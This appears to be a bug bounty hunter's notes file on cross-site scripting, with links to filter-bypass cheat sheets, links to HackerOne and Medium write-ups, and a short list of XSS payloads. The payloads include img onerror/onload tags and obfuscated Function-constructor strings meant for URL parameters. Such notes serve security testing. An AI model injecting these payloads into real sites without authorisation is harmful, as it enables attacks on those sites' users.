Notes - 
- https://d3adend.org/xss/ghettoBypass
- https://github.com/masatokinugawa/filterbypass/wiki/Browser's-XSS-Filter-Bypass-Cheat-Sheet



WriteUps
- https://hackerone.com/reports/949382
- XSS + CSRF https://rohit-soni.medium.com/story-behind-sweet-ssrf-40c705f13053
- https://medium.com/bugbountywriteup/automating-xss-using-dalfox-gf-and-waybackurls-bc6de16a5c75
- https://hackerone.com/reports/1085914
- https://hackerone.com/reports/1082847
- https://infosecwriteups.com/how-i-made-it-to-google-hof-f1cec85fdb1b

PayLoads
- "><img src=x onerror=alert(document.domain)>
- Comment - <img src="https://intensedebate.com/images/a-addblog.png" onload="alert()">
- inurl - test ‘-Function`self[‘a’\x2b’l’\x2b’e’\x2b’r’\x2b’t’]\x281\x29```-’
- inurl - test ‘-Function`self[‘a’+’l’+’e’+’r’+’t’](1)```-’


